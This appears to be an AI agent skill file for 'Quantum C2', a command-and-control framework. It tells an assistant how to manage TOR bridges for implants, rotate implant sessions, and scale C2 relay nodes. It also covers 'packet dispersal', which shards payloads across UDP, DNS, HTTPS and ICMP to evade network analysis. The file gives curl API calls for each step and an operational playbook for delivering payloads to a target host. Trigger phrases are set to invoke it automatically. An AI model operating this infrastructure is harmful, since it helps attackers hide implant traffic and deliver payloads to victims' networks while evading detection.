---
name: quantum-c2-infra
description: >
  C2 infrastructure management for Quantum C2. Covers TOR bridge management, packet dispersal configuration, infrastructure scaling, and health monitoring. Use when the user needs to manage C2 transport infrastructure, configure packet dispersal, scale C2 nodes, or monitor infrastructure health. Triggers on: "C2 infrastructure", "TOR bridge", "packet dispersal", "infrastructure scaling", "bridge management", "dispersal config", "C2 health", "infrastructure monitor", "scale C2".
---

# Quantum C2 Infrastructure

Manage C2 transport infrastructure including TOR bridges, packet dispersal, scaling, and health monitoring.

## Overview

The Infrastructure module provides the transport layer for C2 operations:

- **TOR Bridge Management** — Anonymized transport with multiple protocols
- **Packet Dispersal** — Multi-protocol payload sharding and reassembly
- **Infrastructure Scaling** — Horizontal scaling of C2 nodes
- **Health Monitoring** — Real-time infrastructure status and alerts

## TOR Bridge Management

Managed by `backend/app/modules/c2_infrastructure/tor_bridge.py`.

### Bridge Architecture

```
┌─────────────┐     ┌──────────────┐     ┌──────────────┐
│   Client    │────>│ TOR Bridge   │────>│  C2 Server   │
│  (Implant)  │     │  (obfs4/sf)  │     │  (Backend)   │
└─────────────┘     └──────────────┘     └──────────────┘
                         │
                    ┌────┴────┐
                    │ Bridge  │
                    │  Pool   │
                    └─────────┘
```

### Supported Transports

| Transport | Protocol | Port Range | Censorship Resistance |
|-----------|----------|------------|----------------------|
| `obfs4` | Obfuscated v4 | 443-9050 | High |
| `snowflake` | WebRTC proxy | 443 | Very High |
| `meq` | Custom obfuscation | 8080-8443 | Medium |
| `webtunnel` | HTTPS-wrapped | 443 | High |
| `direct` | Direct TOR | 9001 | Low |

### Bridge Pool Management

```bash
# View bridge pool status
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/infrastructure/tor/bridges

# Response:
{
  "total_bridges": 11,
  "status_distribution": {"active": 9, "degraded": 2, "offline": 0},
  "transport_distribution": {"obfs4": 5, "snowflake": 3, "webtunnel": 3},
  "active_clients": 4,
  "bridges": [
    {
      "bridge_id": "bridge-a1b2c3d4",
      "address": "198.51.100.1",
      "port": 443,
      "transport": "obfs4",
      "fingerprint": "abc123def456...",
      "status": "active",
      "latency_ms": 120.5,
      "uptime_seconds": 86400,
      "failover_count": 0
    }
  ]
}
```

### Add Custom Bridge
```bash
curl -X POST http://localhost:8000/api/infrastructure/tor/bridges \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "address": "bridge.example.com",
    "port": 443,
    "transport": "obfs4",
    "fingerprint": "<bridge_fingerprint_hex>"
  }'
```

### Client Registration
```bash
# Register client to TOR bridge
curl -X POST http://localhost:8000/api/infrastructure/tor/register \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "implant-001",
    "preferred_transport": "obfs4",
    "exclude_bridges": ["bridge-abc123"]
  }'

# Response:
{
  "client_id": "implant-001",
  "bridge": {
    "bridge_id": "bridge-a1b2c3d4",
    "address": "198.51.100.1",
    "port": 443,
    "transport": "obfs4",
    "status": "active",
    "latency_ms": 120.5
  },
  "session_key": "<hex_session_key>",
  "registered_at": 1723892400.0
}
```

### Bridge Rotation
```bash
# Rotate client to new bridge
curl -X POST http://localhost:8000/api/infrastructure/tor/rotate \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"client_id": "implant-001"}'

# Response:
{
  "client_id": "implant-001",
  "previous_bridge_id": "bridge-a1b2c3d4",
  "new_bridge": {
    "bridge_id": "bridge-e5f6g7h8",
    "address": "198.51.100.2",
    "port": 453,
    "transport": "obfs4",
    "status": "active",
    "latency_ms": 95.2
  },
  "session_key": "<new_hex_session_key>",
  "rotation_count": 1,
  "rotated_at": 1723896000.0
}
```

### Client Status
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/infrastructure/tor/client/implant-001

# Response:
{
  "registration": {
    "client_id": "implant-001",
    "primary_bridge_id": "bridge-e5f6g7h8",
    "assigned_at": 1723892400.0,
    "last_rotation": 1723896000.0,
    "rotation_count": 1,
    "bridge_history": ["bridge-a1b2c3d4"],
    "is_active": true
  },
  "current_bridge": {...},
  "session_age_seconds": 3600,
  "time_since_rotation_seconds": 120
}
```

### Health Monitoring

The bridge manager runs automatic health checks:

- **Interval:** Configurable (default: 30 seconds)
- **Latency Threshold:** 400ms (above = degraded)
- **Auto-Failover:** Clients on degraded bridges are moved to active bridges
- **Recovery:** Degraded bridges that recover are returned to active status

```bash
# Check monitoring status
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/infrastructure/tor/monitoring

# Start/stop monitoring
curl -X POST http://localhost:8000/api/infrastructure/tor/monitoring/start -H "Authorization: Bearer $TOKEN"
curl -X POST http://localhost:8000/api/infrastructure/tor/monitoring/stop -H "Authorization: Bearer $TOKEN"
```

## Packet Dispersal

Managed by `backend/app/modules/c2_infrastructure/packet_dispersal.py`.

### Concept

Split payloads into protocol-diverse shards that are individually innocuous. Each shard travels via a different protocol, evading network analysis that looks for complete payloads.

### Supported Protocols

| Protocol | Encoding | Mimics | Bandwidth |
|----------|----------|--------|-----------|
| `udp` | UDPDAT: prefix | Custom UDP traffic | High |
| `dns` | Dot-separated labels | DNS queries | Low |
| `http` | GET request | Static asset fetch | Medium |
| `https` | POST request | Telemetry data | High |
| `icmp` | ECHO-REQ: prefix | ICMP echo | Low |

### Dispersal Workflow

```bash
# 1. Create dispersal session
curl -X POST http://localhost:8000/api/infrastructure/dispersal/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "target": "192.168.1.100",
    "payload": "<base64_encoded_payload>",
    "protocols": ["udp", "dns", "https"],
    "shard_size": 256
  }'

# Response:
{
  "session_id": "disp-abc123def456",
  "target": "192.168.1.100",
  "total_shards": 8,
  "original_size": 2048,
  "protocol_distribution": {
    "0": "udp", "1": "dns", "2": "https",
    "3": "udp", "4": "dns", "5": "https",
    "6": "udp", "7": "dns"
  },
  "shards": [
    {
      "shard_id": "shard-a1b2c3d4",
      "sequence": 0,
      "protocol": "udp",
      "checksum": "sha256:abc123...",
      "total_shards": 8
    }
  ],
  "created_at": 1723892400.0
}
```

### Submit Received Shard
```bash
curl -X POST http://localhost:8000/api/infrastructure/dispersal/{session_id}/shard \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "shard_id": "shard-a1b2c3d4",
    "shard_data": "<base64_encoded_shard>",
    "checksum": "sha256:abc123..."
  }'

# Response:
{
  "session_id": "disp-abc123def456",
  "shard_id": "shard-a1b2c3d4",
  "shards_received": 3,
  "total_shards": 8,
  "progress": 0.375,
  "is_complete": false
}
```

### Reassemble Payload
```bash
curl -X POST http://localhost:8000/api/infrastructure/dispersal/{session_id}/reassemble \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "shard_ids": ["shard-a1b2c3d4", "shard-e5f6g7h8", ...]
  }'

# Response:
{
  "session_id": "disp-abc123def456",
  "payload": "<reassembled_payload>",
  "payload_size": 2048,
  "shards_used": 8,
  "protocol_sequence": ["udp", "dns", "https", "udp", "dns", "https", "udp", "dns"],
  "reassembled_at": 1723892500.0
}
```

### Session Management
```bash
# Check session status
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/infrastructure/dispersal/{session_id}

# List all sessions
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/infrastructure/dispersal/
```

## Infrastructure Scaling

### Horizontal Scaling

Scale C2 infrastructure by adding nodes:

```bash
# Add new C2 node
curl -X POST http://localhost:8000/api/infrastructure/nodes \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "hostname": "c2-node-02.example.com",
    "ip_address": "198.51.100.10",
    "role": "relay",
    "region": "eu-west",
    "capacity": {
      "max_sessions": 1000,
      "max_bandwidth_mbps": 100
    }
  }'
```

### Node Roles

| Role | Description | Capacity |
|------|-------------|----------|
| `primary` | Main C2 server | Full feature set |
| `relay` | Traffic relay node | Session forwarding |
| `bridge` | TOR bridge node | Anonymized transport |
| `listener` | Protocol listener | Single protocol |
| `storage` | Data storage node | Payload/session storage |

### Load Balancing

```bash
# Check load distribution
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/infrastructure/load

# Response:
{
  "nodes": [
    {"id": "node-01", "role": "primary", "sessions": 45, "capacity": 1000, "load_percent": 4.5},
    {"id": "node-02", "role": "relay", "sessions": 120, "capacity": 500, "load_percent": 24.0}
  ],
  "total_sessions": 165,
  "total_capacity": 1500,
  "overall_load_percent": 11.0
}
```

## Health Monitoring

### System Health Dashboard

```bash
# Full infrastructure health
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/infrastructure/health

# Response:
{
  "status": "healthy",
  "timestamp": "2026-08-17T10:30:00Z",
  "components": {
    "tor_bridges": {
      "status": "healthy",
      "total": 11,
      "active": 9,
      "degraded": 2,
      "offline": 0
    },
    "dispersal_engine": {
      "status": "healthy",
      "active_sessions": 3,
      "max_sessions": 1000
    },
    "nodes": {
      "status": "healthy",
      "total": 2,
      "healthy": 2,
      "unhealthy": 0
    },
    "listeners": {
      "status": "healthy",
      "active": 5,
      "stopped": 1
    }
  }
}
```

### Alert Configuration

```bash
# Configure infrastructure alerts
curl -X POST http://localhost:8000/api/infrastructure/alerts/config \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "bridge_degraded_threshold": 2,
    "bridge_offline_alert": true,
    "dispersal_session_timeout_seconds": 3600,
    "node_cpu_threshold_percent": 80,
    "node_memory_threshold_percent": 85,
    "notification_channels": ["email", "telegram"]
  }'
```

### Metrics

```bash
# Get infrastructure metrics
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/infrastructure/metrics

# Response includes:
{
  "bridge_uptime_avg_percent": 98.5,
  "bridge_rotation_count_24h": 12,
  "dispersal_sessions_completed_24h": 47,
  "dispersal_reassembly_success_rate": 0.96,
  "node_uptime_percent": 99.9,
  "total_bandwidth_mbps": 24.5,
  "active_sessions": 165
}
```

## Operational Playbook

### 1. Initialize C2 Infrastructure
```
1. Add TOR bridges: POST /api/infrastructure/tor/bridges (multiple)
2. Start health monitoring: POST /api/infrastructure/tor/monitoring/start
3. Configure dispersal engine (defaults are sufficient)
4. Add relay nodes if scaling needed
5. Verify health: GET /api/infrastructure/health
```

### 2. Deploy Payload via Dispersal
```
1. Create dispersal session with target and payload
2. Select protocols (recommend: udp + dns + https mix)
3. Monitor shard delivery progress
4. Reassemble when all shards received
5. Verify payload integrity via checksum
```

### 3. Scale Infrastructure
```
1. Check current load: GET /api/infrastructure/load
2. Add relay node if load > 70%
3. Register new clients to bridges
4. Monitor new node health
5. Verify load distribution improved
```

### 4. Handle Bridge Degradation
```
1. Monitor detects degraded bridge (latency > 400ms)
2. Auto-failover moves clients to healthy bridges
3. Verify client sessions maintained
4. Investigate degraded bridge root cause
5. Remove or repair degraded bridge
```

## References
- `quantum-c2-stealth` — Network anonymization and TOR usage
- `backend/app/modules/c2_infrastructure/tor_bridge.py` — TOR bridge manager
- `backend/app/modules/c2_infrastructure/packet_dispersal.py` — Packet dispersal engine
